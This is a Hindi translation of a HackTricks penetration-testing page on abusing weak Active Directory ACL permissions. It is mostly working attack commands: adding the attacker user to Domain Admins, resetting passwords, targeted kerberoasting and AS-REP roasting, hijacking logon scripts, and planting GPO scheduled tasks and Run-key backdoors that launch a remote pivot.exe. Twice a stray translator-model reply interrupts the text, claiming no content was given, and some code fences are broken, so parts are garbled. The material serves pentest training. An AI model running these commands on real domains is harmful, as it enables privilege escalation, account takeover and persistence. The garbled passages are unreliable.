# एक्टिव डायरेक्टरी ACLs/ACEs का दुरुपयोग

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

अपनी तकनीकी स्टैक में, APIs से लेकर वेब ऐप्स और क्लाउड सिस्टम्स तक, सबसे महत्वपूर्ण कमजोरियों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी अटैक सरफेस को ट्रैक करता है, प्रोएक्टिव थ्रेट स्कैन चलाता है, और समस्याओं को खोजता है। आज ही [**मुफ्त में इसे आजमाएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## संदर्भ

यह लैब एक्टिव डायरेक्टरी विवेकाधीन एक्सेस कंट्रोल लिस्ट्स (DACLs) और एक्सेस कंट्रोल एंट्रीज (ACEs) की कमजोर अनुमतियों का दुरुपयोग करने के लिए है जो DACLs का निर्माण करते हैं।

एक्टिव डायरेक्टरी ऑब्जेक्ट्स जैसे कि यूजर्स और ग्रुप्स सुरक्षित ऑब्जेक्ट्स हैं और DACL/ACEs यह निर्धारित करते हैं कि कौन उन ऑब्जेक्ट्स को पढ़/संशोधित कर सकता है (जैसे कि अकाउंट नाम बदलना, पासवर्ड रीसेट करना, आदि)।

"डोमेन एडमिन्स" सुरक्षित ऑब्जेक्ट के लिए ACEs का एक उदाहरण यहाँ देखा जा सकता है:

![](../../../.gitbook/assets/1.png)

कुछ एक्टिव डायरेक्टरी ऑब्जेक्ट अनुमतियाँ और प्रकार जिनमें हम, हमलावरों को रुचि है:

* **GenericAll** - ऑब्जेक्ट के पूर्ण अधिकार (एक ग्रुप में यूजर्स जोड़ना या यूजर का पासवर्ड रीसेट करना)
* **GenericWrite** - ऑब्जेक्ट के गुणों को अपडेट करना (जैसे कि लॉगऑन स्क्रिप्ट)
* **WriteOwner** - ऑब्जेक्ट के मालिक को हमलावर नियंत्रित यूजर में बदलना और ऑब्जेक्ट को अधिग्रहण करना
* **WriteDACL** - ऑब्जेक्ट के ACEs को संशोधित करना और हमलावर को ऑब्जेक्ट पर पूर्ण नियंत्रण अधिकार देना
* **AllExtendedRights** - एक ग्रुप में यूजर जोड़ने या पासवर्ड रीसेट करने की क्षमता
* **ForceChangePassword** - यूजर का पासवर्ड बदलने की क्षमता
* **Self (Self-Membership)** - खुद को एक ग्रुप में जोड़ने की क्षमता

इस लैब में, हम उपरोक्त ACEs में से अधिकांश का पता लगाने और उनका शोषण करने का प्रयास करेंगे।

[BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) और जितने भी संभव हो सके एक्टिव डायरेक्टरी [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) के साथ खुद को परिचित करना लाभदायक है क्योंकि आपको कभी नहीं पता कि आपको एक मूल्यांकन के दौरान कम सामान्य एक से सामना कब हो सकता है।

## यूजर पर GenericAll

पावरव्यू का उपयोग करते हुए, चलिए जांचते हैं कि क्या हमारे हमलावर यूजर `spotless` के पास AD ऑब्जेक्ट `delegate` पर `GenericAll rights` हैं:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
हम देख सकते हैं कि वास्तव में हमारे उपयोगकर्ता `spotless` के पास `GenericAll` अधिकार हैं, जो हमलावर को खाते पर पूर्ण नियंत्रण लेने की क्षमता प्रदान करता है:

![](../../../.gitbook/assets/2.png)

*   **पासवर्ड बदलें**: आप उस उपयोगकर्ता का पासवर्ड इस प्रकार बदल सकते हैं

```bash
net user <username> <password> /domain
```
*   **लक्षित Kerberoasting**: आप उपयोगकर्ता को **kerberoastable** बना सकते हैं, उसके खाते पर **SPN** सेट करके, फिर kerberoast करके ऑफलाइन क्रैक करने का प्रयास करें:

```powershell
# SPN सेट करें
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# हैश प्राप्त करें
.\Rubeus.exe kerberoast /user:<username> /nowrap
# SPN साफ़ करें
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# आप उपकरण https://github.com/ShutdownRepo/targetedKerberoast का भी उपयोग कर सकते हैं
# एक या सभी उपयोगकर्ताओं के हैश प्राप्त करने के लिए
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **लक्षित ASREPRoasting**: आप उपयोगकर्ता को **ASREPRoastable** बना सकते हैं, **प्रीऑथेंटिकेशन** को **अक्षम** करके और फिर ASREPRoast कर सकते हैं।

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## समूह पर GenericAll

आइए देखते हैं कि `Domain admins` समूह में कोई कमजोर अनुमतियां हैं या नहीं। सबसे पहले, आइए इसका `distinguishedName` प्राप्त करें:
```csharp
Get-NetGroup "domain admins" -FullData
```
Since the content you've requested to translate is not provided, I'm unable to proceed with the translation. If you provide the specific English text that needs to be translated into Hindi, I can assist you with that. Please share the text, and I'll translate it while maintaining the markdown and HTML syntax as per your instructions.
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
हम देख सकते हैं कि हमारे आक्रमणकारी उपयोगकर्ता `spotless` के पास एक बार फिर `GenericAll` अधिकार हैं:

![](../../../.gitbook/assets/5.png)

प्रभावी रूप से, यह हमें (उपयोगकर्ता `spotless`) को `Domain Admin` समूह में जोड़ने की अनुमति देता है:
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

यही काम Active Directory या PowerSploit मॉड्यूल के साथ भी किया जा सकता है:
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write पर Computer/User

* यदि आपके पास **Computer object** पर ये विशेषाधिकार हैं, तो आप [Kerberos **Resource-based Constrained Delegation**: Computer Object Take Over](../resource-based-constrained-delegation.md) को अंजाम दे सकते हैं।
* यदि आपके पास एक उपयोगकर्ता पर ये विशेषाधिकार हैं, तो आप [इस पृष्ठ पर बताए गए पहले तरीकों में से एक](./#genericall-on-user) का उपयोग कर सकते हैं।
* या, चाहे आपके पास Computer या एक उपयोगकर्ता में हो, आप **Shadow Credentials** का उपयोग करके उसका अनुकरण कर सकते हैं:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty पर Group

यदि हमारे नियंत्रित उपयोगकर्ता के पास `Domain Admin` समूह के `All` ऑब्जेक्ट्स पर `WriteProperty` अधिकार है:

![](../../../.gitbook/assets/7.png)

हम फिर से खुद को `Domain Admins` समूह में जोड़ सकते हैं और विशेषाधिकारों को बढ़ा सकते हैं:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## समूह पर स्वयं (स्व-सदस्यता)

एक और विशेषाधिकार जो हमलावर को समूह में स्वयं को जोड़ने की अनुमति देता है:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (स्वयं-सदस्यता)

एक और विशेषाधिकार जो हमलावर को एक समूह में स्वयं को जोड़ने की अनुमति देता है:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
Since the content you've requested to translate is not provided, I'm unable to perform the translation. If you provide the specific English text that needs to be translated into Hindi, I can assist you with that. Please share the text, and I'll translate it while maintaining the markdown and HTML syntax as per your instructions.
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

यदि हमारे पास `User-Force-Change-Password` ऑब्जेक्ट प्रकार पर `ExtendedRight` है, तो हम उपयोगकर्ता का पासवर्ड उनके वर्तमान पासवर्ड को जाने बिना रीसेट कर सकते हैं:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

पॉवरव्यू के साथ यही काम करना:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
```markdown
![](../../../.gitbook/assets/14.png)

एक और विधि जिसके लिए पासवर्ड-सिक्योर-स्ट्रिंग परिवर्तन के साथ छेड़छाड़ की आवश्यकता नहीं है:
```
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
```markdown
![](../../../.gitbook/assets/15.png)

...या यदि इंटरैक्टिव सत्र उपलब्ध नहीं है तो एक लाइनर:
```
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

और Linux से इसे प्राप्त करने का एक अंतिम तरीका:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
अधिक जानकारी:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner पर Group

ध्यान दें कि हमले से पहले `Domain Admins` का मालिक `Domain Admins` है:

![](../../../.gitbook/assets/17.png)

ACE गणना के बाद, यदि हम पाते हैं कि हमारे नियंत्रण में एक उपयोगकर्ता के पास `ObjectType:All` पर `WriteOwner` अधिकार हैं
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
![](../../../.gitbook/assets/18.png)

...हम `Domain Admins` ऑब्जेक्ट के मालिक को हमारे यूजर `spotless` में बदल सकते हैं। ध्यान दें कि `-Identity` के साथ निर्दिष्ट SID `Domain Admins` समूह का SID है:
```
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## उपयोगकर्ता पर GenericWrite
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
`WriteProperty` का उपयोग `ObjectType` पर किया जाता है, जो इस विशेष मामले में `Script-Path` है, जो हमलावर को `delegate` उपयोगकर्ता के लॉगऑन स्क्रिप्ट पथ को ओवरराइट करने की अनुमति देता है, जिसका अर्थ है कि अगली बार, जब उपयोगकर्ता `delegate` लॉग ऑन करेगा, उनकी प्रणाली हमारी दुर्भावनापूर्ण स्क्रिप्ट को निष्पादित करेगी:
```
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
नीचे दिखाया गया है कि उपयोगकर्ता का ~~`delegate`~~ लॉगऑन स्क्रिप्ट फ़ील्ड AD में अपडेट हो गया है:

![](../../../.gitbook/assets/21.png)

## समूह पर GenericWrite

यह आपको समूह के सदस्यों के रूप में नए उपयोगकर्ताओं (उदाहरण के लिए आप स्वयं) को सेट करने की अनुमति देता है:
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण कमजोरियों को ढूंढें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह को ट्रैक करता है, सक्रिय खतरे के स्कैन चलाता है, और आपके पूरे टेक स्टैक में मुद्दों का पता लगाता है, APIs से लेकर वेब ऐप्स और क्लाउड सिस्टम्स तक। आज ही [**मुफ्त में आजमाएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

यदि आप किसी समूह के मालिक हैं, जैसे मैं `Test` AD समूह का मालिक हूँ:

![](../../../.gitbook/assets/22.png)

जिसे आप बेशक powershell के माध्यम से कर सकते हैं:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
```markdown
![](../../../.gitbook/assets/23.png)

और आपके पास उस AD ऑब्जेक्ट पर `WriteDACL` है:

![](../../../.gitbook/assets/24.png)

...आप खुद को ADSI जादू की एक चुटकी के साथ [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) विशेषाधिकार दे सकते हैं:
```
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
इसका मतलब है कि अब आप पूरी तरह से AD ऑब्जेक्ट को नियंत्रित करते हैं:

![](../../../.gitbook/assets/25.png)

इसका प्रभावी अर्थ यह है कि अब आप इस समूह में नए उपयोगकर्ता जोड़ सकते हैं।

यह ध्यान देने योग्य है कि मैं इन विशेषाधिकारों का दुरुपयोग Active Directory मॉड्यूल और `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके नहीं कर सका:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
```markdown
## **डोमेन पर प्रतिकृति (DCSync)**

**DCSync** अनुमति का तात्पर्य डोमेन पर इन अनुमतियों का होना है: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।\
[**DCSync हमले के बारे में यहाँ और जानें।**](../dcsync.md)

## GPO प्रतिनिधिमंडल <a href="#gpo-delegation" id="gpo-delegation"></a>

कभी-कभी, कुछ उपयोगकर्ता/समूहों को Group Policy Objects को प्रबंधित करने के लिए प्रतिनिधिमंडल अनुमति दी जा सकती है, जैसे कि `offense\spotless` उपयोगकर्ता के साथ:

![](../../../.gitbook/assets/a13.png)

हम इसे PowerView का उपयोग करके इस प्रकार देख सकते हैं:
```
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
नीचे दिया गया यह संकेत देता है कि उपयोगकर्ता `offense\spotless` के पास **WriteProperty**, **WriteDacl**, **WriteOwner** विशेषाधिकार हैं, जिनमें से कुछ अन्य भी हैं जो दुरुपयोग के लिए परिपक्व हैं:

![](../../../.gitbook/assets/a14.png)

### GPO अनुमतियों का परीक्षण करें <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

हम जानते हैं कि ऊपर के स्क्रीनशॉट से प्राप्त ObjectDN `New Group Policy Object` GPO को संदर्भित करता है क्योंकि ObjectDN `CN=Policies` की ओर इशारा करता है और साथ ही `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` भी, जो GPO सेटिंग्स में नीचे हाइलाइट किया गया है:

![](../../../.gitbook/assets/a15.png)

यदि हम विशेष रूप से गलत कॉन्फ़िगर किए गए GPOs की खोज करना चाहते हैं, तो हम PowerSploit से कई cmdlets को इस प्रकार जोड़ सकते हैं:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**निर्धारित नीति वाले कंप्यूटर**

हम अब उन कंप्यूटर नामों का पता लगा सकते हैं जिन पर GPO `Misconfigured Policy` लागू की गई है:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
```markdown
![](../../../.gitbook/assets/a17.png)

**एक निश्चित कंप्यूटर पर लागू की गई नीतियाँ**
```
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
**निर्धारित नीति लागू किए गए OUs**
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **GPO का दुरुपयोग -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

इस गलत कॉन्फ़िगरेशन का दुरुपयोग करने और कोड निष्पादन प्राप्त करने के तरीकों में से एक GPO के माध्यम से एक तत्काल निर्धारित कार्य बनाना है:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

उपरोक्त हमारे उपयोगकर्ता spotless को समझौता किए गए बॉक्स के स्थानीय `administrators` समूह में जोड़ देगा। ध्यान दें कि कोड निष्पादन से पहले समूह में उपयोगकर्ता `spotless` शामिल नहीं है:

![](../../../.gitbook/assets/a20.png)

### GroupPolicy मॉड्यूल **- GPO का दुरुपयोग**

{% hint style="info" %}
आप यह जांच सकते हैं कि GroupPolicy मॉड्यूल स्थापित है या नहीं `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands` के साथ। आपात स्थिति में, आप इसे स्थानीय व्यवस्थापक के रूप में `Install-WindowsFeature –Name GPMC` के साथ स्थापित कर सकते हैं।
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- GPO का दुरुपयोग**

{% hint style="info" %}
यह GPO नहीं बना सकता, इसलिए हमें अभी भी RSAT के साथ या हमारे पास पहले से लिखने की पहुँच वाले किसी GPO को संशोधित करना होगा।
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### नीति अद्यतन बलपूर्वक लागू करें <a href="#force-policy-update" id="force-policy-update"></a>

पिछले दुरुपयोगी **GPO अद्यतन हर लगभग 90 मिनट में पुनः लोड किए जाते हैं।**\
यदि आपके पास कंप्यूटर तक पहुँच है, तो आप `gpupdate /force` के साथ इसे बलपूर्वक लागू कर सकते हैं।

### आंतरिक कार्यप्रणाली <a href="#under-the-hood" id="under-the-hood"></a>

यदि हम `Misconfigured Policy` GPO के निर्धारित कार्यों को देखें, तो हम वहाँ हमारे `evilTask` को देख सकते हैं:

![](../../../.gitbook/assets/a22.png)

नीचे GPO में हमारे दुष्ट निर्धारित कार्य को दर्शाने वाली XML फ़ाइल है जो `New-GPOImmediateTask` द्वारा बनाई गई थी:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### उपयोगकर्ता और समूह <a href="#users-and-groups" id="users-and-groups"></a>

वही विशेषाधिकार वृद्धि GPO उपयोगकर्ता और समूह सुविधा का दुरुपयोग करके प्राप्त की जा सकती है। नीचे दी गई फ़ाइल में, लाइन 6 पर ध्यान दें जहाँ उपयोगकर्ता `spotless` को स्थानीय `administrators` समूह में जोड़ा गया है - हम उपयोगकर्ता को कुछ और में बदल सकते हैं, एक और उपयोगकर्ता जोड़ सकते हैं या यहां तक कि उपयोगकर्ता को एक और समूह/कई समूहों में जोड़ सकते हैं क्योंकि हम दिखाए गए स्थान पर नीति कॉन्फ़िगरेशन फ़ाइल में संशोधन कर सकते हैं, जो कि हमारे उपयोगकर्ता `spotless` को सौंपे गए GPO प्रतिनिधिमंडल के कारण है:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
```
{% endcode %}

इसके अलावा, हम लॉगऑन/लॉगऑफ स्क्रिप्ट्स का उपयोग करने, रजिस्ट्री के लिए ऑटोरन्स का उपयोग करने, .msi इंस्टॉल करने, सेवाओं को संपादित करने और इसी तरह के कोड निष्पादन मार्गों का लाभ उठाने के बारे में सोच सकते हैं।

## संदर्भ

* मूल रूप से, यह जानकारी ज्यादातर [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) से नकल की गई थी।
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण कमजोरियों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी अटैक सरफेस को ट्रैक करता है, सक्रिय खतरा स्कैन चलाता है, और आपके पूरे टेक स्टैक में, APIs से लेकर वेब ऐप्स और क्लाउड सिस्टम्स तक, मुद्दों को खोजता है। आज ही [**मुफ्त में इसे आजमाएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से नायक तक</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में शामिल हों या मुझे **Twitter** 🐦 पर **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
```
